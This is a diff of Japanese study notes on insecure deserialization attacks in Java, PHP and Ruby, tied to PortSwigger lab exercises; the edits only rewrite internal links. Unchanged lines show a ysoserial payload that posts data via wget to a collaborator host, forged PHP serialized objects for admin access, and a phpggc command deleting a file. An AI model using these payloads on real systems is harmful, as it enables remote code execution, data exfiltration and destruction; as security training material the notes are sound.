@@ -1,6 +1,6 @@
-- [[#Java]]
-- [[#PHP]]
-- [[#Ruby]]
+- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#Java)
+- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#PHP)
+- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#Ruby)
 
 ---
 ## Java
@@ -30,7 +30,7 @@
 
 ##### 自動：Java Deserialization Scannerを使用する
 
-- [[Extension：Java Deserialization Scannerの使い方#実行ステップ]]
+- [Extension：Java Deserialization Scannerの使い方](Extension：Java%20Deserialization%20Scannerの使い方.md#実行ステップ)
 
 ###### 手動
 
@@ -46,7 +46,7 @@ java -jar ysoserial-all.jar [payload] 'wget https://COLLABORATOR_DOMAIN --post-f
 ```
 - (`-w 0`: base64のオプション。改行を注入しないようにする)
 
-2. 生成されたオブジェクトを、[[#準備]]で明らかにしたエンコーディング方式に合わせて必要であればURLエンコードし(ctrl + U)、元のオブジェクトを上書きしてリクエストする
+2. 生成されたオブジェクトを、[⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#準備)で明らかにしたエンコーディング方式に合わせて必要であればURLエンコードし(ctrl + U)、元のオブジェクトを上書きしてリクエストする
 3. Collaboratorを確認する
 
 ---
@@ -72,7 +72,7 @@ O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
 3. オブジェクトを上書きし、adminパネルにアクセスする(`GET /admin`)
 
 [LAB: Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
-参考：[[3. シリアライズされたオブジェクトの操作による悪用#phpの緩い比較( ==)]]
+参考：[3. シリアライズされたオブジェクトの操作による悪用](3.%20シリアライズされたオブジェクトの操作による悪用.md#phpの緩い比較(%20==))
 
 ---
 ### アプリケーションの機能を利用する
@@ -94,7 +94,7 @@ O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";s:11:"a
 ---
 ### 任意のオブジェクトを注入する
 
-1. [[🔍 Insecure deserialization#ソースコードや設定ファイルの検査]]で使用できそうなマジックメソッドを発見する
+1. [🔍 Insecure deserialization](🔍%20Insecure%20deserialization.md#ソースコードや設定ファイルの検査)で使用できそうなマジックメソッドを発見する
 	- `__construct()` → クラスインスタンス化時に呼ばれる
 	- `__destruct()` → スクリプト実行終了時に呼び出される
 	- `__wakeup()` → オブジェクトデシリアライズ時に呼ばれる`
@@ -127,15 +127,15 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 ---
 ### PHPGGCを使用する
 
-1. [[🔍 Insecure deserialization#PHP]]で使用されているフレームワークを明らかにする
-2. [[🔍 Insecure deserialization#ソースコードや設定ファイルの検査]]でphpinfoを開く
+1. [🔍 Insecure deserialization](🔍%20Insecure%20deserialization.md#PHP)で使用されているフレームワークを明らかにする
+2. [🔍 Insecure deserialization](🔍%20Insecure%20deserialization.md#ソースコードや設定ファイルの検査)でphpinfoを開く
 3. シリアライズされたオブジェクトをデコードする
 ```
 {"token":"base64でエンコードされたオブジェクト","sig_hmac_sha1":"f610b165d4601c74b859e31c005bf9db1ebad93a"}
 ```
 
 4. `hmac`などのハッシュに着目。ハッシュ演算には"secret_key"が必要なので、ステップ2で開いたphpinfoから入手しておく
-5. ステップ1で明らかにしたフレームワークに対してphpggcでオブジェクトを生成する方法を[[4.マジックメソッドによる悪用#使用方法基本]]で調査し、オブジェクトを生成する
+5. ステップ1で明らかにしたフレームワークに対してphpggcでオブジェクトを生成する方法を[4.マジックメソッドによる悪用](4.マジックメソッドによる悪用.md#使用方法基本)で調査し、オブジェクトを生成する
 ```zsh
 ./phpggc symfony/rce4 exec 'rm /home/carlos/morale.txt' | base64
 ```
@@ -162,4 +162,4 @@ php script.php > object.txt
 ---
 ## Ruby
 
-- [[4.マジックメソッドによる悪用#文書化されたガジェットチェーンの利用(without tool)]]
+- [4.マジックメソッドによる悪用](4.マジックメソッドによる悪用.md#文書化されたガジェットチェーンの利用(without%20tool))
